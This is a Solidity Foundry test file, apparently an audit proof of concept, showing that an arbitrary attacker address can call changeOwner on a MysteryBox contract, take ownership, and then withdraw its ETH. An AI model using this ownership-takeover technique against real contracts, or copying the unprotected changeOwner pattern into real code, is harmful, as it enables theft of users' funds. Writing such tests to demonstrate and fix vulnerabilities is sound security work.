// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol"; // Import the console logging utility
import "../src/MysteryBox.sol";

contract ChangeOwnerTest is Test {
    MysteryBox mysteryBox;
    address public owner;
    address public attacker;

    function setUp() public {
        owner = address(this); // Set the test contract as the owner
        attacker = address(1); // Set an attacker address

        console.log("Deploying MysteryBox contract");
        // Deploy the MysteryBox contract with the required initial ETH
        mysteryBox = new MysteryBox{value: 0.1 ether}();
    }

    function testExploitChangeOwner() public {
        console.log("Initial owner of the contract:", mysteryBox.owner());

        // Attacker attempting to change ownership
        vm.startPrank(attacker);
        mysteryBox.changeOwner(attacker);
        vm.stopPrank();

        console.log("New owner of the contract should be the attacker:", mysteryBox.owner());

        // Check that the attacker is now the owner
        assertEq(mysteryBox.owner(), attacker, "Ownership should be changed to the attacker");

        // Further exploits can be carried out now that the attacker is the owner
        console.log("Attempting to withdraw funds as the new owner");

        // Attacker can withdraw funds
        uint256 initialAttackerBalance = attacker.balance;
        vm.startPrank(attacker);
        mysteryBox.withdrawFunds();
        vm.stopPrank();

        uint256 finalAttackerBalance = attacker.balance;
        console.log("Attacker's balance before withdraw:", initialAttackerBalance);
        console.log("Attacker's balance after withdraw:", finalAttackerBalance);

        // Uncomment below if you want to assert the balance changes
        // assertEq(finalAttackerBalance - initialAttackerBalance, 0.1 ether, "Attacker should have withdrawn the contract funds");
    }
}
